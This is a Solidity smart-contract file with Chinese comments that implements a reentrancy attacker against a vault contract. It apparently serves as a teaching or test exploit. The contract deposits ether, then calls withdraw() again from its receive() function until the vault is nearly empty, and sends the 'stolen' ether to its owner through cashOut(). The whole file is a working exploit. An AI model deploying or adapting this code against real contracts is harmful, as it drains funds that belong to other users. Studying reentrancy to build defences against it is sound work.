// SPDX-License-Identifier: SEE LICENSE IN LICENSE
pragma solidity ^0.8.20;

interface IReentrancyVault {
    function deposit() external payable;
    function withdraw() external;
}

/**
 * @title ReentrancyAttacker
 * @notice 攻击 ReentrancyVault 的恶意合约
 * @dev receive() 中递归调用 withdraw()，直到 Vault 余额耗尽
 */
contract ReentrancyAttacker {
    IReentrancyVault public immutable vault;
    address public immutable owner;
    uint256 public stolenAmount;

    constructor(address _vault) {
        vault = IReentrancyVault(_vault);
        owner = msg.sender;
    }

    /// @notice 发起攻击
    /// @dev 需要先存一点 ETH 进去（通过 deposit 方法）
    function attack() external payable {
        require(msg.sender == owner, "Not owner");
        require(msg.value >= 1 ether, "Need at least 1 ether to attack");

        // 先存款（攻击者要用自己的余额作为"引子"）
        vault.deposit{value: msg.value}();

        // 触发取款 → 这会回调 receive()，开始递归攻击
        vault.withdraw();
    }

    /// @notice 接收 ETH 时自动触发 — 这是攻击的核心！
    receive() external payable {
        stolenAmount += msg.value;

        // 检查 Vault 还有没有余额，有的话继续重入
        uint256 vaultBalance = address(vault).balance;
        if (vaultBalance >= 1 ether) {
            // 取款上限不超过当前攻击者余额（否则 require 过不去）
            // 这里用 vault.balances[address(this)] 取的是旧值！
            vault.withdraw();
        }
    }

    /// @notice 提取盗取的 ETH 到攻击者钱包
    function cashOut() external {
        require(msg.sender == owner, "Not owner");
        (bool success, ) = owner.call{value: address(this).balance}("");
        require(success, "Cash out failed");
    }

    // 为了接收攻击收益，还需要 fallback
    fallback() external payable {}
}